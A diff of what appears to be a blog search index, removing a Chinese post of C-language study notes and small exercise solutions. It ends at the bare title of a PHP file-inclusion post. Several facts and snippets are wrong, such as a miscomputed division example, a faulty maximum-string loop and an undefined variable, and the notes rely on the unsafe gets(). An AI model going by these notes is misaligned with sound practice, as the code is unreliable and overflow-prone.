-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="C语言易错难懂知识"><a href="#C语言易错难懂知识" class="headerlink" title="C语言易错难懂知识"></a>C语言易错难懂知识</h1><h2 id="一些基础知识"><a href="#一些基础知识" class="headerlink" title="一些基础知识"></a>一些基础知识</h2><p>1.进制</p>
-<p>二进制：0b开头</p>
-<p>八进制：0开头</p>
-<p>十六进制：0X开头（0<del>9，A</del>F）</p>
-<p>2.float  4字节 有效数字6</p>
-<p>   double  8字节 有效数字15</p>
-<p>不同类型数据运算时，除强制类型转换外，结果都为double型</p>
-<p>在一个整数末尾加L&#x2F;l表示长整型</p>
-<p>eg. int b&#x3D;5;</p>
-<p>​      float a&#x3D;2.0;</p>
-<p>​      b&#x3D;b&#x2F;2*a; &#x2F;&#x2F;b&#x3D;5</p>
-<p>3.素数中：不必被2<del>（n-1）整除，只需被2</del>✓n即可，j*j&lt;i</p>
-<p>4.a%b结果由a的正负性决定，只要a为负数，结果为负数</p>
-<p>5.常量和常变量</p>
-<p>常变量：在定义变量时，加一个const</p>
-<p>​            eg.const int a&#x3D;3;</p>
-<p>变量：</p>
-<p>（1）整型变量 1000</p>
-<p>（2）实型变量 12.34e3</p>
-<p>（3）字符常量（只能为一个字符,’ \42 ‘为一个字符）</p>
-<p>​       1）普通字符：以ASCII码存储</p>
-<p>​                                常见的ASCII：’A’ &#x3D;65   ‘a’ &#x3D;97   0 &#x3D;48</p>
-<p>​       2）转义字符：以’ \ ‘开头，将’ \ ‘后的字符转化为另外意思</p>
-<p>​                             eg.’ \x41 ‘表示16进制41的ASCII字符，即’ A ‘</p>
-<p>​       3）字符串常量：“boy”</p>
-<p>​       4）符号常量（不能对其赋新值）：#define PI 3.1416</p>
-<p>6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线</p>
-<p>7.unsigned int &#x3D;&gt;无符号整型  输出用%u</p>
-<p>   （充分利用变量的值的范围（数据范围只有正值））</p>
-<p>8.逗号表达式结果取后面的值</p>
-<p>  eg.i&#x3D;(a&#x3D;6,a*5),a+6;&#x2F;&#x2F;&gt;i&#x3D;30</p>
-<p>9.要输出%应该连续使用2个%</p>
-<p>10.字符变量</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char c=&#x27; ? &#x27;;</span><br><span class="line">printf(&quot;%d %c&quot;,c,c);</span><br><span class="line">=&gt;63 ?</span><br></pre></td></tr></table></figure>
-
-<p>11.i++和++i</p>
-<p>i&#x3D;3;</p>
-<p>j&#x3D;i++(i&#x3D;4,j&#x3D;3)&#x2F;&#x2F;先赋值后自加</p>
-<p>j&#x3D;++i(i&#x3D;4,j&#x3D;4)&#x2F;&#x2F;先自加在赋值</p>
-<p>12.输出：</p>
-<p>用%f得到6位小数</p>
-<p>%-m.nf ：</p>
-<p>​	   -号为左对齐</p>
-<p>​	  m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 				     m，则按实际长度输出，不截断</p>
-<p>​	  n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足</p>
-<p>%e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列</p>
-<p>eg.1.234560 e+002</p>
-<p>13.运算符优先级</p>
-<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250117135802930.png"></p>
-<p>14.字符（一个）输入输出：</p>
-<p>getchar  putchar(c)</p>
-<p>15.在判断一个量是否为真时，0为假，非0为真</p>
-<p>a&amp;&amp;b&#x2F;&#x2F;a和b都非0（只有a为真时，才需要判别b的值）</p>
-<p>a||b&#x2F;&#x2F;a和b至少一个非0（只有a为假时才需要判别b的值）</p>
-<p>16.判断非闰年：</p>
-<p><code>!((year%4==0&amp;&amp;year%100!=0)||year%400==0)</code></p>
-<p>17.两个数乘积&#x3D;两个数最大公约数 x 最小公倍数</p>
-<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="？：表达式（代替复杂的if）"><a href="#？：表达式（代替复杂的if）" class="headerlink" title="？：表达式（代替复杂的if）"></a>？：表达式（代替复杂的if）</h3><p>max&#x3D;(a&gt;b)?a:b;&#x2F;&#x2F;a&gt;b为真的话，max&#x3D;a，否则为b</p>
-<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>switch(表达式){</p>
-<p>​	case 常量1:语句1;</p>
-<p>​	……</p>
-<p>​	default:……;</p>
-<p>}</p>
-<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><h3 id="while语句"><a href="#while语句" class="headerlink" title="while语句"></a>while语句</h3><p>只要循环条件表达式为真时，就执行</p>
-<p>eg.while(i–)&#x2F;&#x2F;每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一</p>
-<h3 id="do-while语句"><a href="#do-while语句" class="headerlink" title="do while语句"></a>do while语句</h3><p>先无条件执行，再判断循环条件是否成立</p>
-<h3 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h3><p>for(…;…[只要值为真，就执行循环];…)</p>
-<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break：提前终止循环</p>
-<p>continue：提前结束本次循环，接着执行下次循环</p>
-<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p><code>a[3][4]</code> &#x3D;&gt;3行4列</p>
-<h3 id="字符数组"><a href="#字符数组" class="headerlink" title="字符数组"></a>字符数组</h3><h4 id="字符串结束标志"><a href="#字符串结束标志" class="headerlink" title="字符串结束标志"></a>字符串结束标志</h4><p>一个字符串以字符<code>&#39;\0&#39;</code>作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\0’作结束符）</p>
-<h4 id="字符数组的输入输出"><a href="#字符数组的输入输出" class="headerlink" title="字符数组的输入输出"></a>字符数组的输入输出</h4><p>%s &#x3D;&gt;整个字符串</p>
-<p>%c &#x3D;&gt;一个字符</p>
-<p>输出时遇到’\0’就停止输出</p>
-<p>scanf输入项如果是字符数组名，不加&amp;</p>
-<p>scanf读取字符串时，会在遇空白字符时停止读取</p>
-<h5 id="单行字符串"><a href="#单行字符串" class="headerlink" title="单行字符串"></a>单行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while((ch=getchar())!=&#x27;\n&#x27;)&#123;</span><br><span class="line">	a[i]=ch;</span><br><span class="line">	i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char string[100];</span><br><span class="line">char c;</span><br><span class="line">gets(string);</span><br><span class="line">for(int i=0;(c=string[i])!=&#x27;\0&#x27;;i++)&#123;···&#125;\\遍历字符串中每个字符</span><br></pre></td></tr></table></figure>
-
-<h5 id="n行字符串"><a href="#n行字符串" class="headerlink" title="n行字符串"></a>n行字符串</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char a[100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(a);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">getchar();</span><br><span class="line">char string[n][100];</span><br><span class="line">for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">	gets(string[i]);</span><br><span class="line">	for(int j=0;string[i][j]!=&#x27;\0&#x27;;j++)&#123;···&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h4><p>记得加<code>#include&lt;string.h&gt;</code></p>
-<h5 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h5><p>输出的字符串中可以包含转义字符</p>
-<p>e.g </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char str[]=&#123;&quot;abc \n def&quot;&#125;;</span><br><span class="line">puts(str);</span><br><span class="line">   =&gt;abc</span><br><span class="line">     def</span><br></pre></td></tr></table></figure>
-
-<h5 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h5><p>从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址</p>
-<p>注：gets和puts函数只能输入&#x2F;输出一个字符串</p>
-<h5 id="strcat"><a href="#strcat" class="headerlink" title="strcat"></a>strcat</h5><p>把两个字符数组中字符串连接起来</p>
-<p>strcat(str1,str2);</p>
-<h5 id="strcpy和strncpy"><a href="#strcpy和strncpy" class="headerlink" title="strcpy和strncpy"></a>strcpy和strncpy</h5><p>字符串复制函数</p>
-<h6 id="strcpy"><a href="#strcpy" class="headerlink" title="strcpy"></a>strcpy</h6><p>将字符串2复制到字符数组1中</p>
-<p>注：赋值语句只能将一个字符赋给一个字符型变量&#x2F;字符数组元素</p>
-<h6 id="strncpy"><a href="#strncpy" class="headerlink" title="strncpy"></a>strncpy</h6><p>将字符串2中前n个字符复制到字符数组1中</p>
-<p>strncpy(str1,str2,2);&#x2F;&#x2F;将str2前2个取代str1原有的2个</p>
-<h5 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h5><p>字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\0’为止</p>
-<p>字符串1&#x3D;字符串2  函数值为0</p>
-<p>字符串1&gt;字符串2  函数值为正整数</p>
-<p>字符串1&lt;字符串2  函数值为负整数</p>
-<h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>测字符串长度</p>
-<h5 id="strlwr"><a href="#strlwr" class="headerlink" title="strlwr"></a>strlwr</h5><p>转换为小写</p>
-<h5 id="strupr"><a href="#strupr" class="headerlink" title="strupr"></a>strupr</h5><p>转换为大写</p>
-<h4 id="头文件"><a href="#头文件" class="headerlink" title="&lt;ctype.h&gt;头文件"></a>&lt;ctype.h&gt;头文件</h4><p>isalpha判断一个字符是否是字母</p>
-<p>isdigit判断一个字符是否是数字</p>
-<p>islower判断一个字符是否是小写字母</p>
-<p>isupper判断一个字符是否是大写字母</p>
-<p>isspace判断一个字符是否是空白字符</p>
-<p>tolower将字符大写变小写</p>
-<p>toupper将字符小写变大写</p>
-<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数的定义与声明"><a href="#函数的定义与声明" class="headerlink" title="函数的定义与声明"></a>函数的定义与声明</h3><p>在定义函数时要指定函数的类型</p>
-<p>函数类型决定返回值类型</p>
-<p>用函数原型（函数首部）作函数声明</p>
-<p>e.g int add(int a,int b);</p>
-<h3 id="函数的嵌套"><a href="#函数的嵌套" class="headerlink" title="函数的嵌套"></a>函数的嵌套</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int max4(int a,int b,int c,int d)&#123;</span><br><span class="line">	int max2(int a,int b);</span><br><span class="line">	return max2(max2(max2(a,b),c),d);</span><br><span class="line">&#125;</span><br><span class="line">int max2(int a,int b)&#123;</span><br><span class="line">	return(a&gt;=b?a:b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="局部与全局变量"><a href="#局部与全局变量" class="headerlink" title="局部与全局变量"></a>局部与全局变量</h3><p>注：全局变量开头一般用大写字母，来区别局部变量</p>
-<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>静态局部&#x2F;全局变量</p>
-<p>函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值</p>
-<p>e.g <code>static int f=1;</code></p>
-<h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>外部变量声明</p>
-<p>在一个文件内扩展外部变量的作用域</p>
-<p>将外部变量的作用域扩展到其他文件</p>
-<p>e.g <code>extern A,B,C; \ \可省略int等类型</code></p>
-<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="指针变量"><a href="#指针变量" class="headerlink" title="指针变量"></a>指针变量</h3><p>指针是一个地址，而指针变量是存放地址的变量</p>
-<p>指针变量中只能存放地址（指针），不要将一个整数给指针变量</p>
-<p>p&#x3D;&a;</p>
-<p>*p&#x3D;1;\ \将1赋值给p所指向的变量即把1赋给a</p>
-<p>定义：类型名 * 指针变量名</p>
-<p>​	int* point;      </p>
-<p>​	point&#x3D;&a;\ \等价于int* point&#x3D;&a;</p>
-<p>函数调用时不加*</p>
-<p>e.g swap(point_1,point_2);</p>
-<p>为使在函数中改变的变量能被main所用，应该用指针变量做函数参数</p>
-<p>e.g</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void swap(int *p1,int *p2)&#123;</span><br><span class="line">	int temp;</span><br><span class="line">	temp=*p1;</span><br><span class="line">	*p1=*p2;</span><br><span class="line">	*p2=temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="通过指针引用数组"><a href="#通过指针引用数组" class="headerlink" title="通过指针引用数组"></a>通过指针引用数组</h3><h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int *p;</span><br><span class="line">p=&amp;a[0];\\不能写成*p=&amp;a[0];</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=&amp;a[0];</span><br><span class="line">p=a;\\p的值是数组a的首元素</span><br></pre></td></tr></table></figure>
-
-<p>如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素</p>
-<p>如果p的初值为&amp;a[0]，则p+i&#x2F;a+i即a[i]的地址，*(p+i)&#x2F; *(a+i)是p+i&#x2F;a+i所指向的数组元素即a[i]</p>
-<p>两个地址不能相加</p>
-<p>若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i,a[10];</span><br><span class="line">int* p=a;\\p初值是a，p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++)scanf(&quot;%d&quot;,p++);</span><br><span class="line">p=a;\\重新使p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++,p++)printf(&quot;%d&quot;,*p);</span><br></pre></td></tr></table></figure>
-
-<p>若a[0]&#x3D;3，++(*p) &#x3D;&gt;a[0]&#x3D;4</p>
-<p>fun(int arr[],int n)  &#x3D;  fun(int* arr,int n)</p>
-<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><code>*(a[i]+j)</code>或 <code>*(*(a+i)+j)</code>是<code>a[i][j]</code>的值</p>
-<p>对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元&#x2F;其中的值</p>
-<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250119103815734.png"></p>
-<p>int (*p)[4]定义包含4个元素的一维数组的指针变量</p>
-<p>e.g 有一个二维数组<code>int arr[3][4]</code>，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int arr[3][4]=&#123;&#123;0,1,2,3&#125;,&#123;4,5,6,7&#125;,&#123;8,9,10,11&#125;&#125;;</span><br><span class="line">int (*p)[4]=&amp;arr[0];\\p指向arr某一行</span><br></pre></td></tr></table></figure>
-
-<h3 id="通过指针引用字符串"><a href="#通过指针引用字符串" class="headerlink" title="通过指针引用字符串"></a>通过指针引用字符串</h3><p>通过字符数组名&#x2F;字符指针变量可以输出一个字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* a,str[10];</span><br><span class="line">a=str;</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br></pre></td></tr></table></figure>
-
-<p>数组名虽代表地址，但它是常量，其值不可改变</p>
-<p>字符指针变量指向的字符串常量中的内容是不可被取代</p>
-<h3 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h3><p>函数名是一个指针（地址）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)(int,int)</span><br><span class="line">p=max;\\将函数入口地址赋给p</span><br><span class="line">c=(*p)(a,b);\\用*p代替函数名</span><br></pre></td></tr></table></figure>
-
-<p>char* p[6]包含6个指针的数值</p>
-<h2 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>struct 结构体名{</p>
-<p>​	成员表列（类型名 成员名）;</p>
-<p>};</p>
-<p>引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num&#x3D;10010;</p>
-<p>不能通过输出结构体变量名来达到输出结构体变量所有成员的值</p>
-<p>若p指向一个结构体变量stu</p>
-<p>则 stu.num &lt;&#x3D;&gt; (*p).num &lt;&#x3D;&gt; p-&gt;num</p>
-<p>结构体数组读入不用加&amp;</p>
-<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>union 共用体名{</p>
-<p>​	成员表列（类型名 成员名）;</p>
-<p>};</p>
-<h3 id="typedef声明新类型名"><a href="#typedef声明新类型名" class="headerlink" title="typedef声明新类型名"></a>typedef声明新类型名</h3><h1 id="C语言经典例题"><a href="#C语言经典例题" class="headerlink" title="C语言经典例题"></a>C语言经典例题</h1><h2 id="统计一个字符串中每个单词的字符数"><a href="#统计一个字符串中每个单词的字符数" class="headerlink" title="统计一个字符串中每个单词的字符数"></a>统计一个字符串中每个单词的字符数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char c;</span><br><span class="line">	int count=0;\\用于统计当前单词的字符数</span><br><span class="line">	int first=1;\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个</span><br><span class="line">	while(scanf(&quot;%c&quot;,&amp;c)&amp;&amp;c!=&#x27;.&#x27;)&#123;</span><br><span class="line">		if(c==&#x27; &#x27;)&#123;\\如果读取到的字符是空格，说明当前单词结束</span><br><span class="line">			if(count&gt;0)&#123;\\如果count大于0，说明前面有单词字符被统计</span><br><span class="line">				if(!first)printf(&quot; &quot;);\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔</span><br><span class="line">				printf(&quot;%d&quot;,count);</span><br><span class="line">				first=0;</span><br><span class="line">				count=0;\\重置count为0，准备统计下一个单词</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else count++;\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">	if(count&gt;0)&#123;\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出</span><br><span class="line">		if(!first)printf(&quot; &quot;);\\如果不是第一个输出，先输出一个空格</span><br><span class="line">		printf(&quot;%d&quot;,count);\\输出最后一个单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="统计3个字符串，并找出其中最大值"><a href="#统计3个字符串，并找出其中最大值" class="headerlink" title="统计3个字符串，并找出其中最大值"></a>统计3个字符串，并找出其中最大值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char str [3] [20];</span><br><span class="line">	char string[20];</span><br><span class="line">	for(int i=0;i&lt;3;i++)&#123;</span><br><span class="line">		gets(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">		if(strcmp(str[i],str[i+1])&gt;0)strcpy(string,str[i]);</span><br><span class="line">		if(strcmp(str[i],str[i+1])&lt;=0)strcpy(string,str[i+1]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="字符串的复制（指针）"><a href="#字符串的复制（指针）" class="headerlink" title="字符串的复制（指针）"></a>字符串的复制（指针）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to=*from)!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		to++;</span><br><span class="line">		from++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to++=*from++)!=&#x27;\0&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while(*from!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		*to++=*from++;</span><br><span class="line">		*to=&#x27;\0&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void selectSort(int arr[],int n)&#123;</span><br><span class="line">    int i,j,minIndex,temp;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;  //外层循环控制排序趟数</span><br><span class="line">        minIndex=i;  //假设当前位置元素就是最小值</span><br><span class="line">        for (j=i+1;j&lt;n;j++)&#123;  //内层循环在剩余元素中找最小值</span><br><span class="line">            if(arr[j]&lt;arr[minIndex])minIndex=j;  //更新最小值索引</span><br><span class="line">        &#125;</span><br><span class="line">        if(minIndex!=i)&#123;  //如果找到更小的元素，进行交换</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[minIndex];</span><br><span class="line">            arr[minIndex]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="人数过半"><a href="#人数过半" class="headerlink" title="人数过半"></a>人数过半</h2><p>输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。</p>
-<p>输入格式:</p>
-<p>第一行输入一个正整数N(N&lt;1000)；</p>
-<p>第二行输入N个数，每个数的绝对值不超过1e9。</p>
-<p>输出格式:</p>
-<p>输出一个数，即出现次数超过总数一半的数。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    int a[2000];</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    int can=a[0];</span><br><span class="line">    int cnt=1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        if(cnt==0)&#123;</span><br><span class="line">            can=a[i];</span><br><span class="line">            cnt=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(can==a[i])cnt++;</span><br><span class="line">        else cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;,can);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="n个数字中选出数字和最大的连续一段"><a href="#n个数字中选出数字和最大的连续一段" class="headerlink" title="n个数字中选出数字和最大的连续一段"></a>n个数字中选出数字和最大的连续一段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum1=0,sum=-1000;</span><br><span class="line">   for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">       sum1=(sum1+a[i])&gt;a[i]?(sum1+a[i]):a[i];</span><br><span class="line">       if(sum1&gt;sum)sum=sum1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%d&quot;,sum);</span><br></pre></td></tr></table></figure>
-
-<h2 id="结尾不输出空行"><a href="#结尾不输出空行" class="headerlink" title="结尾不输出空行"></a>结尾不输出空行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int flag=1;</span><br><span class="line">···</span><br><span class="line">if(!flag)printf(&quot;\n&quot;);</span><br><span class="line">flag=0;</span><br><span class="line">···\\输出···</span><br></pre></td></tr></table></figure>
-
-<h2 id="数组元素右移"><a href="#数组元素右移" class="headerlink" title="数组元素右移"></a>数组元素右移</h2><p>n个数，第i个数向右移m个整数变为a[(i+n-m)%n]</p>
-<h2 id="单词翻转"><a href="#单词翻转" class="headerlink" title="单词翻转"></a>单词翻转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">char* r(char* s)&#123;</span><br><span class="line">	int len=strlen(s);</span><br><span class="line">	for(int i=0;i&lt;len/2;i++)&#123;</span><br><span class="line">		char t=s[i];</span><br><span class="line">		s[i]=s[len-1-i];</span><br><span class="line">		s[len-1-i]=t;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char s[25];</span><br><span class="line">	while(scanf(&quot;%s&quot;,s)!=EOF)&#123; \\去除多余空格</span><br><span class="line">		printf(&quot;%s&quot;,r(s));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="10进制数n转化成m进制"><a href="#10进制数n转化成m进制" class="headerlink" title="10进制数n转化成m进制"></a>10进制数n转化成m进制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int cnt=1,sum=0;</span><br><span class="line">while(n&gt;0)&#123;</span><br><span class="line">	t=n%m;</span><br><span class="line">	t*=cnt;</span><br><span class="line">	sum+=t;</span><br><span class="line">	n/=m;</span><br><span class="line">	cnt*=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="求n的素数因子和"><a href="#求n的素数因子和" class="headerlink" title="求n的素数因子和"></a>求n的素数因子和</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;sqrt(n);i++)&#123;</span><br><span class="line">	if(n%i==0)&#123;</span><br><span class="line">		sum+=i;</span><br><span class="line">		if(n/i!=i)&#123;</span><br><span class="line">			sum+=n/i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="求a，b的最大公约数"><a href="#求a，b的最大公约数" class="headerlink" title="求a，b的最大公约数"></a>求a，b的最大公约数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m=a;</span><br><span class="line">n=b;</span><br><span class="line">while(n!=0)&#123;</span><br><span class="line">	t=m%n;</span><br><span class="line">	m=n;</span><br><span class="line">	n=t;</span><br><span class="line">&#125;\\m即为最大公约数</span><br></pre></td></tr></table></figure>
-
-<h2 id="将一个n位数反转"><a href="#将一个n位数反转" class="headerlink" title="将一个n位数反转"></a>将一个n位数反转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int number,res=0,rem;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">while(number!=0)&#123;</span><br><span class="line">	rem=num%10;</span><br><span class="line">	res=res*10+rem;</span><br><span class="line">	number/=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int rows,conf=1;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;rows);</span><br><span class="line">	for(int i=0;i&lt;rows;i++)&#123;</span><br><span class="line">		for(int space=1;space&lt;=rows-i-1;space++)&#123;</span><br><span class="line">			printf(&quot;  &quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for(int j=0;j&lt;=i;j++)&#123;</span><br><span class="line">			if(j==0||i==0)conf=1;</span><br><span class="line">			else conf=conf*(i-j+1)/j;</span><br><span class="line">			printf(&quot;%4d &quot;,conf);</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</div>]]></content>
-      <categories>
-        <category>编程</category>
-      </categories>
-      <tags>
-        <tag>编程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript</title>
     <url>/2024/10/15/JavaScript/</url>
     <content><![CDATA[<div id="postchat_postcontent"><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><p>HTML 中的 Javascript 脚本代码必须位于 <code>&lt;script&gt;</code> 与 <strong><code>&lt;/script&gt;</code></strong> 标签间</p>
@@ -1840,301 +1840,6 @@
         <tag>前端</tag>
         <tag>JavaScript</tag>
         <tag>DOM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP文件包含漏洞</title>
-    <url>/2025/02/17/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
